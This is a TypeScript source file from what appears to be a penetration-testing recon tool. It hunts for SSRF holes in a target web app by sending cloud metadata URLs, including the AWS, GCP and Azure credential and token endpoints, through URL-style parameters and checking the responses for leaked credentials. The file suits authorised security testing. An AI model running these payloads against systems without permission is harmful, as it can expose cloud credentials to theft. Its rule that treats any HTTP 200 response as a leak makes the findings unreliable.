// src/recon/cloud-metadata-probe.ts
//
// Probes whether the target app leaks cloud-metadata URLs (AWS IMDSv1/v2,
// GCP metadata, Azure IMDS) via SSRF surfaces. Strategy:
//   1. For each candidate SSRF surface endpoint in the AppModel
//      (anything with a `url`/`uri`/`callback`/`webhook`/`fetch`/`load`/`proxy`
//       param), submit a payload URL pointing at the metadata service.
//   2. If an OAST base is provided, generate a unique callback URL on the OAST
//      server and use that as the payload, so we can detect blind SSRF.
//   3. If no OAST base, attempt the metadata URL directly and inspect the
//      response body for known metadata shape (AccessKeyId, project-id, etc.).
//   4. Write results to `appModel.cloudProbes[]`.
//
// This is RECON only — actual exploitation (extracting creds, calling S3) is
// the cloud specialist's job.

import { readAppModel, updateAppModelSection, type AppModel, type CloudProbeResult, type AppModelEndpoint } from '../core/app-model';
import { logReconEntry } from './index';

const METADATA_TARGETS: Record<string, { url: string; provider: CloudProbeResult['provider']; regex: RegExp; severity: CloudProbeResult['severity'] }> = {
  'aws-imdsv1': {
    url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    provider: 'aws',
    regex: /(AccessKeyId|SecretAccessKey|Token|"Code"\s*:\s*"Success")/i,
    severity: 'critical',
  },
  'aws-imdsv2': {
    url: 'http://169.254.169.254/latest/api/token',
    provider: 'aws',
    regex: /^[A-Za-z0-9+/=_-]{16,}$/,
    severity: 'critical',
  },
  'aws-hostname': {
    url: 'http://169.254.169.254/latest/meta-data/hostname',
    provider: 'aws',
    regex: /^[a-z0-9.-]+$/i,
    severity: 'medium',
  },
  'gcp-meta': {
    url: 'http://metadata.google.internal/computeMetadata/v1/project/project-id',
    provider: 'gcp',
    regex: /^[a-z][a-z0-9-]{4,28}[a-z0-9]$/i,
    severity: 'critical',
  },
  'gcp-token': {
    url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    provider: 'gcp',
    regex: /"(access_token|token_type|expires_in)"/i,
    severity: 'critical',
  },
  'azure-imds': {
    url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    provider: 'azure',
    regex: /"compute"|"vmScaleSetName"|"subscriptionId"/i,
    severity: 'critical',
  },
  'azure-token': {
    url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
    provider: 'azure',
    regex: /"access_token"/i,
    severity: 'critical',
  },
  'digitalocean-meta': {
    url: 'http://169.254.169.254/metadata/v1.json',
    provider: 'digitalocean',
    regex: /"hostname"|"region"/i,
    severity: 'high',
  },
  'oracle-meta': {
    url: 'http://192.0.0.192/latest/meta-data/instance/displayName',
    provider: 'oracle',
    regex: /^[A-Za-z0-9_-]+$/,
    severity: 'high',
  },
};

const SSRF_PARAM_PATTERNS = /^(url|uri|callback|webhook|fetch|load|proxy|img|image|target|host|domain|redirect|continue|return|next|dest|site|view|preview|open|src|source|reference|ref|link|out)$/i;

export async function runCloudMetadataProbe(
  target: string,
  appModelPath: string,
  timeoutMs: number = 5000,
  oastBaseUrl?: string,
  customHeaders?: Record<string, string>,
  cookies?: Record<string, string>,
): Promise<{ probes: CloudProbeResult[] }> {
  const start = Date.now();
  const model = readAppModel(appModelPath);
  const probes: CloudProbeResult[] = [];

  // find candidate SSRF surfaces
  const surfaces = findSsrfSurfaces(model);

  if (surfaces.length === 0) {
    logReconEntry(appModelPath, {
      tool: 'cloud-metadata-probe',
      target,
      status: 'inconclusive',
      durationMs: Date.now() - start,
      detail: 'no SSRF-prone endpoints in app-model; skipping',
    });
    return { probes };
  }

  for (const surface of surfaces) {
    for (const [probeId, meta] of Object.entries(METADATA_TARGETS)) {
      // build payload URL
      let payloadUrl = meta.url;
      if (oastBaseUrl) {
        const uuid = `cloud-${probeId}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
        payloadUrl = `${oastBaseUrl.replace(/\/$/, '')}/${uuid}?target=${encodeURIComponent(meta.url)}`;
      }
      const result = await probeSurface(surface, payloadUrl, meta.provider, meta.severity, timeoutMs, customHeaders, cookies);
      if (result.status === 'leaked') {
        probes.push({
          probeId,
          provider: meta.provider,
          metadataUrl: meta.url,
          surface: 'ssrf',
          status: 'leaked',
          responseSnippet: result.snippet,
          severity: meta.severity,
          discoveredAt: Date.now(),
        });
      } else if (result.status === 'unknown' && oastBaseUrl) {
        // OAST callback would have fired; if it didn't, blind SSRF is blocked
        probes.push({
          probeId,
          provider: meta.provider,
          metadataUrl: meta.url,
          surface: 'ssrf',
          status: 'inconclusive',
          responseSnippet: result.snippet,
          severity: 'info',
          discoveredAt: Date.now(),
        });
      }
    }
  }

  if (probes.length > 0) {
    updateAppModelSection(appModelPath, 'cloudProbes', probes);
  }

  logReconEntry(appModelPath, {
    tool: 'cloud-metadata-probe',
    target,
    status: probes.some(p => p.status === 'leaked') ? 'found' : (probes.length > 0 ? 'inconclusive' : 'not-found'),
    durationMs: Date.now() - start,
    detail: `${probes.length} probe(s); ${probes.filter(p => p.status === 'leaked').length} leaked`,
  });

  return { probes };
}

function findSsrfSurfaces(model: AppModel): AppModelEndpoint[] {
  const surfaces: AppModelEndpoint[] = [];
  for (const ep of model.endpoints) {
    for (const p of ep.params || []) {
      if (SSRF_PARAM_PATTERNS.test(p.name) && p.type === 'string') {
        surfaces.push(ep);
        break;
      }
    }
    // also match the URL itself
    if (/\?(url|uri|callback|webhook|fetch|load|proxy|img|preview)=/.test(ep.path)) {
      surfaces.push(ep);
    }
  }
  return surfaces;
}

async function probeSurface(
  surface: AppModelEndpoint,
  payloadUrl: string,
  _provider: CloudProbeResult['provider'],
  _severity: CloudProbeResult['severity'],
  timeoutMs: number,
  customHeaders?: Record<string, string>,
  cookies?: Record<string, string>,
): Promise<{ status: CloudProbeResult['status']; snippet: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const headers: Record<string, string> = {
    'user-agent': 'ultimatrix-recon/1.0',
    'accept': '*/*',
    ...(customHeaders || {}),
  };
  if (cookies && Object.keys(cookies).length > 0) {
    headers['cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  }

  // find the SSRF param
  const ssrfParam = (surface.params || []).find(p => SSRF_PARAM_PATTERNS.test(p.name))?.name || 'url';
  const url = surface.path.includes('?')
    ? `${surface.path}&${encodeURIComponent(ssrfParam)}=${encodeURIComponent(payloadUrl)}`
    : `${surface.path}?${encodeURIComponent(ssrfParam)}=${encodeURIComponent(payloadUrl)}`;

  try {
    const r = await fetch(url, { signal: controller.signal, headers, method: surface.method || 'GET', redirect: 'manual' });
    const body = await r.text();
    const snippet = body.slice(0, 1024);
    // check for known metadata shape
    const matched = Object.values(METADATA_TARGETS).some(meta => meta.regex.test(snippet));
    if (matched || r.status === 200) {
      return { status: 'leaked', snippet };
    }
    return { status: 'unknown', snippet };
  } catch {
    return { status: 'unknown', snippet: '' };
  } finally {
    clearTimeout(timer);
  }
}
